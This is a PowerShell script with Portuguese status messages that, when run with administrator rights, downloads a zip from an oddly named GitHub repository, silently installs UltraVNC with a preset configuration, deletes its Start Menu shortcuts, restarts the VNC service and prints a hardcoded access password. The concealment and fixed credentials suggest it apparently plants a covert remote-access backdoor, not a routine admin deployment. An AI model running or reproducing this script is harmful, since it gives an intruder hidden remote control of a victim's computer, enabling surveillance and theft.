$admin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
 if ($admin -eq "True") { 

     
      $test = test-path C:\Users\Public\UltraVNC\UltraVNC_1436_X64_Setup.exe
      if ($test -eq "true") {
      
      }
       else 

      {
     
       "[+] Download UltraVNC..."
       $ProgressPreference = 'SilentlyContinue';
       Measure-Command -Expression { 

       Invoke-WebRequest -Uri https://github.com/ucd4cfe/x0nternalsj3a/raw/refs/heads/main/UltraVNC.zip -OutFile $env:public\UltraVNC.zip

       } -ErrorAction 'SilentlyContinue' | Out-Null
     
      }      
      
       Add-Type -AssemblyName System.IO.Compression.FileSystem

       function Unzip

      {

        param([string]$zipfile,[string]$outpath)

        [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile,$outpath)

      }
    
       "[+] Descompactando UltraVNC.zip..." 
       Unzip "$env:public\UltraVNC.zip" "$env:public\UltraVNC" 2> $nul

       "[+] Iniciando instalacao silenciosa..."
       start-process C:\Users\Public\UltraVNC\UltraVNC_1436_X64_Setup.exe -wait -argumentlist '/verysilent /no restart /loadinf="installerselections.inf"' 

       Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\UltraVNC\*" -Force -Recurse

       Copy-Item "$env:public\UltraVNC\ultravnc.ini" -Destination "C:\Program Files\uvnc bvba\UltraVNC" 

         Start-Sleep -Seconds 5

       "[+] Reiniciando servico uvnc service..."
       sc.exe stop uvnc_service -ErrorAction 'SilentlyContinue' | Out-Null
      
         Start-Sleep 5
   
       sc.exe start uvnc_service -ErrorAction 'SilentlyContinue' | Out-Null

        "[+] Senha VNC >>> CYBERsecdat@91"  
        "[+] Finalizado!"   


      }
 
         else
      {
           "[!] Privilegios insufiente"
   
      }
     
    